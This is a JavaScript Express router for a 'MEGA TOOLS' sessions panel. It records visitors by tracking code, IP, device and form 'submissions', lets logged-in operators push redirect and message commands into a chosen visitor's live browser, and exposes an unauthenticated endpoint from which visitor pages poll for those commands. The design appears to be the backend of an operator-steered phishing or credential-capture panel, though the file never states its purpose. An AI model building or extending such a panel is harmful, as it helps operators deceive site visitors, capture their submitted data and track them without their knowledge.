// ============================================================
// MEGA TOOLS — SESSIONS ROUTES (ENTERPRISE v4.4 FIXED)
// FIXED v4.4: format variable defined + SESSIONS_PER_PAGE fallback
// ============================================================

const express = require('express');
const router = express.Router();
const db = require('../database');
const Session = require('../models/Session');
const Link = require('../models/Link');
const User = require('../models/User');
const { ROLES } = require('../models/roles');
const { authenticate } = require('../middleware/auth');
const { getSessionSockets, getRemainingTimeMs } = require('../services/sessionManager');
const { toStringId, parseTrackingCode, paginate, now } = require('../utils/helpers');
const CONFIG = require('../config');

// ============================================================
// CACHE — ✅ v4.4: Scoped find with limit
// ============================================================

let sessionsCache = null;
let sessionsCacheExpiry = 0;
const CACHE_TTL = 5000;

const SESSIONS_PER_PAGE = CONFIG.SESSIONS_PER_PAGE || 20;

async function getCachedSessions(forceRefresh = false) {
  if (forceRefresh || !sessionsCache || sessionsCacheExpiry < Date.now()) {
    sessionsCache = await db.sessions.find({ hiddenForAll: false }, { limit: 10000, sort: { timestamp: -1 } });
    sessionsCacheExpiry = Date.now() + CACHE_TTL;
  }
  return sessionsCache;
}

function clearSessionsCache() {
  sessionsCache = null;
  sessionsCacheExpiry = 0;
}

// ============================================================
// HELPERS
// ============================================================

function isSessionForAnyCode(session, codes) {
  if (!session || !codes || codes.length === 0) return false;
  const tc = session.trackingCode || '';
  return codes.some(code => tc === code || tc.startsWith(code + '_'));
}

async function getUserTrackingCodes(userId) {
  return User.getTrackingCodesForUser(userId);
}

async function getAccessibleTrackingCodes(user) {
  try {
    const allUsers = await db.users.read();
    const uid = toStringId(user._id);
    const codes = [user.trackingCode].filter(Boolean);
    if (user.role === ROLES.OWNER) {
      allUsers.forEach(u => { if (u.trackingCode) codes.push(u.trackingCode); });
    }
    return [...new Set(codes)];
  } catch (error) { throw error; }
}

async function filterSessionsByRole(sessions, user) {
  try {
    if (user.role === ROLES.OWNER) return sessions.filter(s => !s.hiddenForAll);
    const codes = await getUserTrackingCodes(user._id);
    const userId = toStringId(user._id);
    return sessions.filter(s => isSessionForAnyCode(s, codes) && !s.hiddenForAll && !(s.hiddenFor && s.hiddenFor.includes(userId)));
  } catch (error) { throw error; }
}

async function checkSessionAccess(session, user) {
  try {
    if (user.role === ROLES.OWNER) return true;
    const codes = await getUserTrackingCodes(user._id);
    return isSessionForAnyCode(session, codes);
  } catch (error) { return false; }
}

function emitToUserRooms(io, user, event, data) {
  if (!io) return;
  try {
    io.to('user_' + toStringId(user._id)).emit(event, data);
    if (user.trackingCode) io.to('room_' + user.trackingCode).emit(event, data);
  } catch (error) {}
}

function isImageUrl(str) {
  if (!str) return false;
  return /^https?:\/\//.test(str) && /\.(jpg|jpeg|png|gif|webp|svg|bmp|ico)(\?.*)?$/i.test(str);
}

function buildMsgPushPayload(message, targetUrl) {
  const payload = { message: message || '', targetUrl: targetUrl || '' };
  if (isImageUrl(message)) payload.imageUrl = message;
  if (isImageUrl(targetUrl)) payload.imageUrl = targetUrl;
  return payload;
}

function emitMsgPushToOwnerRoom(io, trackingCode, message, targetUrl) {
  if (!io || !trackingCode) return;
  const ownerCode = trackingCode.includes('_') ? trackingCode.split('_')[0] : trackingCode;
  const payload = buildMsgPushPayload(message, targetUrl);
  io.to('room_' + ownerCode).emit('msg_push', payload);
}

// ============================================================
// GLOBAL TIMER ROUTE
// ============================================================

router.get('/timer', authenticate, async (req, res) => {
  try {
    const remainingMs = await getRemainingTimeMs();
    res.json({
      success: true,
      remainingMs,
      remainingSeconds: Math.floor(remainingMs / 1000),
      cycleMs: CONFIG.INBOX_GLOBAL_CYCLE_MS,
      cycleHours: 24,
      timestamp: Date.now(),
    });
  } catch (error) {
    console.error('[Sessions] Timer error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// GET SESSIONS
// ============================================================

router.get('/', authenticate, async (req, res) => {
  try {
    let sessions = await getCachedSessions();
    const pageNum = parseInt(req.query.page) || 1;
    const limitNum = parseInt(req.query.limit) || SESSIONS_PER_PAGE;

    sessions = sessions.filter(s => !s.hiddenForAll);

    if (req.user.role === ROLES.OWNER) {
      sessions.sort((a, b) => {
        if (a.isLive && !b.isLive) return -1;
        if (!a.isLive && b.isLive) return 1;
        return new Date(b.timestamp) - new Date(a.timestamp);
      });
      const result = paginate(sessions, pageNum, limitNum);
      const todayStart = new Date(); todayStart.setHours(0,0,0,0);
      const todaySessions = sessions.filter(s => new Date(s.lastActivity || s.timestamp).getTime() >= todayStart.getTime());
      const uniqueVisitors = new Set(todaySessions.map(s => s.visitorId || s.ip).filter(Boolean)).size;
      const totalSubs = todaySessions.reduce((sum, s) => sum + (s.submissions?.length || 0), 0);
      return res.json({
        sessions: result.data, total: result.total, page: result.page, totalPages: result.totalPages, hasMore: result.hasMore,
        stats: { uniqueSessions: uniqueVisitors, uniqueSubmissions: totalSubs }
      });
    }

    const codes = await getUserTrackingCodes(req.user._id);
    const userId = toStringId(req.user._id);
    const matching = sessions.filter(s => !s.hiddenForAll && isSessionForAnyCode(s, codes) && !(s.hiddenFor && s.hiddenFor.includes(userId)));
    matching.sort((a, b) => {
      if (a.isLive && !b.isLive) return -1;
      if (!a.isLive && b.isLive) return 1;
      return new Date(b.timestamp) - new Date(a.timestamp);
    });

    const total = matching.length;
    const totalPages = Math.ceil(total / limitNum);
    const startIdx = (pageNum - 1) * limitNum;
    const paginatedSessions = matching.slice(startIdx, startIdx + limitNum);

    const todayStart = new Date(); todayStart.setHours(0,0,0,0);
    const todayMs = todayStart.getTime();
    const todaySessions = matching.filter(s => new Date(s.lastActivity || s.timestamp).getTime() >= todayMs);
    const uniqueVisitors = new Set(todaySessions.map(s => s.visitorId || s.ip).filter(Boolean)).size;
    const totalSubs = todaySessions.reduce((sum, s) => sum + (s.submissions?.length || 0), 0);

    res.json({
      sessions: paginatedSessions, total, page: pageNum, totalPages, hasMore: pageNum < totalPages,
      stats: { uniqueSessions: uniqueVisitors, uniqueSubmissions: totalSubs }
    });
  } catch (error) {
    console.error('[Sessions] GET error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// STATS SUMMARY
// ============================================================

router.get('/stats/summary', authenticate, async (req, res) => {
  try {
    let all = await getCachedSessions(true);
    all = all.filter(s => !s.hiddenForAll);
    all = await filterSessionsByRole(all, req.user);
    const todayStart = new Date(); todayStart.setHours(0, 0, 0, 0);
    const todayMs = todayStart.getTime();
    const todaySessions = all.filter(s => new Date(s.lastActivity || s.timestamp).getTime() >= todayMs);
    const uniqueVisitorIds = new Set(todaySessions.map(s => s.visitorId || s.ip).filter(Boolean));
    const todaySubs = todaySessions.reduce((sum, s) => sum + (s.submissions?.length || 0), 0);
    let allTimeSubmissions = 0;
    all.forEach(s => { allTimeSubmissions += (s.submissions?.length || 0); });
    res.json({
      all: {
        live: todaySessions.filter(s => s.isLive).length,
        mobile: todaySessions.filter(s => s.deviceType === 'Mobile').length,
        desktop: todaySessions.filter(s => s.deviceType === 'Desktop').length,
        uniqueSessions: uniqueVisitorIds.size,
        uniqueSubmissions: todaySubs,
        total: todaySessions.length,
        totalAllTime: all.length,
        totalAllTimeSubmissions: allTimeSubmissions,
      }
    });
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// ONLINE USERS
// ============================================================

router.get('/online', authenticate, async (req, res) => {
  try {
    const allSessions = await getCachedSessions(true);
    const allUsers = await db.users.read();
    const nowMs = Date.now();
    const onlineSessions = allSessions.filter(s => {
      if (s.hiddenForAll) return false;
      const lastActivity = new Date(s.lastActivity || s.timestamp || Date.now()).getTime();
      return (nowMs - lastActivity) < CONFIG.SESSION_TIMEOUT_MS;
    });
    const userIdSet = new Set();
    for (const s of onlineSessions) {
      if (s.trackingCode) {
        const user = allUsers.find(u => u.trackingCode && s.trackingCode.startsWith(u.trackingCode));
        if (user) userIdSet.add(toStringId(user._id));
      }
    }
    const onlineUsers = allUsers.filter(u => userIdSet.has(toStringId(u._id)));
    res.json(onlineUsers.map(u => ({
      _id: toStringId(u._id), name: u.name || u.fullName || u.username || 'Unknown',
      username: u.username || '', email: u.email || '', role: u.role || 'user',
      profilePic: u.profilePic || '', trackingCode: u.trackingCode || '', parentId: u.parentId || null,
    })));
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// HIDE SESSION (Single Session Hide — not full delete)
// ============================================================

router.post('/:id/hide', authenticate, async (req, res) => {
  try {
    const session = await Session.hideFromUser(req.params.id, req.user._id);
    if (!session) return res.status(404).json({ message: 'Session not found' });
    clearSessionsCache();
    res.json({ message: 'Hidden', sessionId: req.params.id });
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// MARK SESSION AS SEEN — persistent read state
// ============================================================

router.post('/:id/mark-seen', authenticate, async (req, res) => {
  try {
    const session = await Session.markSeen(req.params.id, req.user._id);
    if (!session) return res.status(404).json({ message: 'Session not found' });
    clearSessionsCache();
    const io = req.app.get('io');
    if (io) {
      emitToUserRooms(io, req.user, 'sessionSeen', {
        sessionId: req.params.id,
        seenBy: toStringId(req.user._id),
        timestamp: now()
      });
    }
    res.json({ success: true, message: 'Session marked as seen', sessionId: req.params.id });
  } catch (error) {
    console.error('[Sessions] mark-seen error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// HYBRID SMART COMMAND SYSTEM
// ============================================================

router.post('/:id/command', authenticate, async (req, res) => {
  try {
    const { action, url, message } = req.body;
    const session = await db.sessions.findById(req.params.id);
    if (!session) return res.status(404).json({ message: 'Session not found' });
    if (!(await checkSessionAccess(session, req.user))) return res.status(403).json({ message: 'Access denied' });

    const updatedSession = await Session.recordCommand(req.params.id, { action: action || 'navigate', url: url || '', message: message || '' });
    updatedSession.pendingCommand = { action: action || 'navigate', url: url || '', message: message || '', seq: updatedSession.commandSeq, timestamp: now(), expiresAt: new Date(Date.now() + 60000).toISOString() };
    await db.sessions.updateOne(req.params.id, { pendingCommand: updatedSession.pendingCommand });
    clearSessionsCache();

    const io = req.app.get('io');
    const sockets = getSessionSockets();
    const command = { action: action || 'navigate', url: url || '', message: message || '', seq: updatedSession.commandSeq, visitorId: updatedSession.visitorId, trackingCode: updatedSession.trackingCode, timestamp: now() };
    const msgPayload = buildMsgPushPayload(message, url);

    if (io && sockets) {
      if (updatedSession.visitorId) {
        const socketId = sockets[updatedSession.visitorId];
        if (socketId) { io.to(socketId).emit('session_command', command); io.to(socketId).emit('msg_push', msgPayload); }
      }
      if (updatedSession.trackingCode) {
        io.to('room_' + updatedSession.trackingCode).emit('session_command', command);
        io.to('room_' + updatedSession.trackingCode).emit('msg_push', msgPayload);
      }
    }
    if (io && updatedSession.trackingCode) emitMsgPushToOwnerRoom(io, updatedSession.trackingCode, message, url);

    res.json({ success: true, message: 'Command sent', command, sessionId: req.params.id });
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// REDIRECT-NEW
// ============================================================

router.post('/:id/redirect-new', authenticate, async (req, res) => {
  try {
    const sessionId = req.params.id;
    const targetUrl = req.body.targetUrl || '';
    const message = req.body.message || '';
    const action = message ? 'navigate+message' : 'navigate';
    const session = await db.sessions.findById(sessionId);
    if (!session) return res.status(404).json({ message: 'Session not found' });
    if (!(await checkSessionAccess(session, req.user))) return res.status(403).json({ message: 'Access denied' });

    const updatedSession = await Session.recordCommand(sessionId, { action, url: targetUrl, message });
    updatedSession.pendingCommand = { action, url: targetUrl, message, seq: updatedSession.commandSeq, timestamp: now(), expiresAt: new Date(Date.now() + 60000).toISOString() };
    await db.sessions.updateOne(sessionId, { pendingCommand: updatedSession.pendingCommand });
    clearSessionsCache();

    const io = req.app.get('io');
    const sockets = getSessionSockets();
    const command = { action, url: targetUrl, message, seq: updatedSession.commandSeq, visitorId: updatedSession.visitorId, trackingCode: updatedSession.trackingCode, timestamp: now() };
    const msgPayload = buildMsgPushPayload(message, targetUrl);

    if (io && sockets) {
      if (updatedSession.visitorId) {
        const socketId = sockets[updatedSession.visitorId];
        if (socketId) { io.to(socketId).emit('session_command', command); io.to(socketId).emit('msg_push', msgPayload); }
      }
      if (updatedSession.trackingCode) {
        io.to('room_' + updatedSession.trackingCode).emit('session_command', command);
        io.to('room_' + updatedSession.trackingCode).emit('msg_push', msgPayload);
      }
    }
    if (io && updatedSession.trackingCode) emitMsgPushToOwnerRoom(io, updatedSession.trackingCode, message, targetUrl);

    res.json({ success: true, message: 'Redirect command sent', command, sessionId });
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// HTTP POLLING: Visitor checks for pending commands
// ============================================================

router.get('/pending-command/:trackingCode', async (req, res) => {
  try {
    const { trackingCode } = req.params;
    const visitorId = req.query.visitorId || '';
    const seq = parseInt(req.query.seq) || 0;
    if (!trackingCode) return res.status(400).json({ success: false, message: 'trackingCode required' });

    let session = null;
    if (visitorId) {
      session = await db.sessions.findOne({ visitorId, hiddenForAll: false });
    }
    if (!session) {
      const code = trackingCode.includes('_') ? trackingCode.split('_')[0] : trackingCode;
      session = await db.sessions.findOne({ ownerCode: code, hiddenForAll: false });
    }
    if (!session || !session.pendingCommand) return res.json({ success: true, pending: false, message: 'No pending commands' });

    const pendingCmd = session.pendingCommand;
    if (pendingCmd.seq && pendingCmd.seq <= seq) return res.json({ success: true, pending: false, message: 'Command already processed' });
    if (pendingCmd.expiresAt && new Date(pendingCmd.expiresAt) < new Date()) return res.json({ success: true, pending: false, message: 'Command expired' });

    await db.sessions.updateOne(session._id, { pendingCommand: null });
    clearSessionsCache();
    res.json({ success: true, pending: true, command: { action: pendingCmd.action, url: pendingCmd.url, message: pendingCmd.message, seq: pendingCmd.seq, timestamp: pendingCmd.timestamp } });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// ============================================================
// EXPORT
// ============================================================

router.get('/export', authenticate, async (req, res) => {
  try {
    let sessions = await getCachedSessions(true);
    if (req.user.role === ROLES.OWNER) sessions = sessions.filter(s => !s.hiddenForAll);
    else sessions = await filterSessionsByRole(sessions, req.user);
    const format = req.query.format || 'csv';

    if (format === 'json') {
      return res.json({
        success: true, count: sessions.length,
        data: sessions.map(s => ({ sessionId: s._id, visitorId: s.visitorId, trackingCode: s.trackingCode, ip: s.ip, device: s.deviceType, browser: s.browser, status: s.status, isLive: s.isLive, clicks: s.clicks || 0, submissions: s.submissions?.length || 0, created: s.created_at, lastSeen: s.lastActivity })),
        timestamp: now(),
      });
    }

    const headers = ['Session ID', 'Visitor ID', 'Tracking Code', 'IP', 'Device', 'Browser', 'Status', 'Live', 'Clicks', 'Submissions', 'Created', 'Last Seen'];
    let csv = headers.join(',') + '\n';
    sessions.forEach(s => {
      csv += [s._id || '', s.visitorId || '', s.trackingCode || '', s.ip || '', s.deviceType || '', (s.browser || '').replace(/,/g, ';'), s.status || '', s.isLive ? 'Yes' : 'No', s.clicks || 0, s.submissions?.length || 0, s.created_at || '', s.lastActivity || ''].join(',') + '\n';
    });
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', `attachment; filename=inbox_export_${Date.now()}.csv`);
    res.send(csv);
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

module.exports = router;